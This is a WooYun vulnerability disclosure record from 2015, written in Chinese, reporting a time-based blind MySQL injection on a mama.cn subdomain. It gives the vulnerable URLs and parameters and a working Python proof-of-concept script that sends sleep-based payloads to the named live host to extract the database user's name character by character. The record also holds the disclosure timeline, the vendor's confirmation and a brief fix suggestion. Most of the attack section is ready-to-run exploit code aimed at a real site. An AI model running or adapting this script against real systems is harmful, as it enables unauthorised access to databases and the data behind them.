{"id": 31308, "wybug_id": "wooyun-2015-0114342", "wybug_title": "妈妈网某站mysql盲注（poc）", "wybug_corp": "妈妈网", "wybug_author": "大懒", "wybug_date": "2015-05-18 09:31", "wybug_open_date": "2015-07-02 09:40", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-05-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-02：\t细节向公众公开  简要描述： 妈妈网mysql盲注 详细说明：  URL：http://brandbase.mama.cn/yikexin.php?ctype=*&mod=growth&op=detail&pgcount=12&tid=1520677POST参数： page=20存在问题参数ctype:sqlmap跑不出来这个点，借助 lijiejie的脚本修改了下，不想自己造轮子。本来因该是两个的，还有一个是主站，由于换了个网络环境，访问不到该URL了，不过我记得部分是当前用户开头是hr什么什么的，长度是36，URL:http://www.mama.cn:80/photo/index.php?a=Search&d=index&g=Search&gotosearch=yes&keyword=*&num=25&page=1&searchtype=photo 存在问题参数是keyword，poc：\n# -*- coding: utf-8 -*-#!/usr/bin/env python#mysql_timebased.pyimport httplibimport urllibheaders = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0'}payloads = 'abcdefghijklmnopqrstuvwxyz1234567890.@_*%'def GetUlength():#获取当前用户长度    userlen = 0    for i in range(1,99):        err_count = 0        for j in range(3):            try:                s1 = \"length(user())=%s\" % i                s = \"if(\"+s1+\",sleep(3),0)/*'XOR(if(1,sleep(3),0))OR%22'XOR(if(1,sleep(3),0))OR%22*/\"                url = '/yikexin.php?ctype=%s&mod=growth&op=detail&pgcount=12&tid=1520677' % s                body = \"page=20\"                conn = httplib.HTTPConnection('brandbase.mama.cn',timeout=3)                conn.request(method='POST',headers=headers,url=url,body=urllib.quote(body))                conn.getresponse()                conn.close()                print '*',            except:                err_count +=1        if err_count == 3:            userlen = i            break    return userlendef GetUser(l):#获取当前用户名    user = ''    for i in range(1,l):        for payload in payloads:            err_count = 0            #print payload            for j in range(3):                try:                    s1 = \"ascii(mid(lower(user()),%s,1))=%s\" % (i,ord(payload))                    s = \"if(\"+s1+\",sleep(3),0)/*'XOR(if(1,sleep(3),0))OR%22'XOR(if(1,sleep(3),0))OR%22*/\"                    url = '/yikexin.php?ctype=%s&mod=growth&op=detail&pgcount=12&tid=1520677' % s                    body = \"page=20\"                    conn = httplib.HTTPConnection('brandbase.mama.cn',timeout=3)                    conn.request(method='POST',headers=headers,url=url,body=urllib.quote(body))                    conn.getresponse()                    conn.close()                    print '*',                except:                    err_count +=1            if err_count == 3:                user += payload                print '\\n[info]',user                break    return user                def main():    userlen = GetUlength()    print \"user length:\\n\",userlen    current_user = GetUser(userlen)    print \"\\n CurrentUser is :\",current_userif __name__ == '__main__':    print 'mysql-timebased-sqlinjection:\\n'    main()\n   漏洞证明：  \n\n   修复方案：  过滤及结构化sql查询   版权声明：转载请注明来源 大懒@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-05-18 09:38 厂商回复： 谢谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}